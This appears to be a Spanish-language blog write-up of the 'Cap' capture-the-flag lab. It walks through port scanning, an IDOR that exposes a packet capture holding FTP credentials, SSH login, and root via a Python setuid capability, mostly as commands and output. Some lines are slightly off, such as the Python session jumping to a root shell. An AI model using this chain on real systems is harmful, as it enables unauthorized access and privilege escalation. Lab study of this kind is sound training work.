---
title: 'Cap'
description: ''
pubDate: 'May 12 2023'
heroImage: 'https://res.cloudinary.com/djc1umong/image/upload/v1686606205/Cap_ypdfef.webp'
slug: 'box/cap'
---

```bash
$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.245 -oG puertosAbiertos
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 10:35 WEST
Initiating SYN Stealth Scan at 10:35
Scanning 10.10.10.245 [65535 ports]
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
Completed SYN Stealth Scan at 10:35, 13.13s elapsed (65535 total ports)
Nmap scan report for 10.10.10.245
Host is up, received user-set (0.058s latency).
Scanned at 2022-08-07 10:35 WEST for 7s
Not shown: 65335 closed tcp ports (reset)
PORT STATE SERVICE REASON
21/tcp open ftp syn-ack ttl 63
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.622MB)
```

vemos un servicio <i>ftp</i> que corre por el puerto 21 podemos intentar:

```bash
ftp 10.10.10.245
```

pero sin contraseña no hacemos mucho, ingresamos a la página y vemos lo siguiente

<img
href='https://res.cloudinary.com/djc1umong/image/upload/v1686606224/cap_main_page_e1ofvh.webp'
width={696}
height={158}
/>

cuando ingresamos a <i>Security Snapshot (5 Second Pcap + Analysis)</i> de la pestaña en la parte izquierda vemos que estamos en la URL
<i> /data/1</i> vemos rápidamente si cambiando el <i>/1</i> con el <i>/0</i> pasa algo vemos que
algunos datos en la columna value si cambian, le damos al botón de descargar

```bash
$ file 0.pcap
0.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
```

después de comprobar que si es un archivo pcap, lo analizamos con tshark

```bash
tshark -r 0.pcap 2&gt;/dev/null
```

<img
href='https://res.cloudinary.com/djc1umong/image/upload/v1686606256/cap_tshark_e5mjpt.webp'
width={760}
height={108}
/>

ahora que tenemos un usuario y contraseña podemos intentar conectarnos con <i>fpt</i> y con ssh.

````bash
$ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:leonardo): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.```

$ ssh nathan@10.10.10.245
nathan@cap:~$ cat user.txt

````

si la máquina se llama <i>Cap</i> intentemos probar si se trata de una <i>capability </i>

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lin/x86_64-linux-gnu/gstreamer1.0/gstreaner-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_bind_service,cap_net_admin+ep
```

si <i>python3.8</i> tiene una capability de tipo <i>SUID </i> entonces con
python cambiamos <i>setuid</i> y nos lanzamos una bash

```bash
nathan@cap:~$ python3.8
>>> import os
>>> os.setuid(0)
root@cap:/# whoami
root
root@cap:/#
```
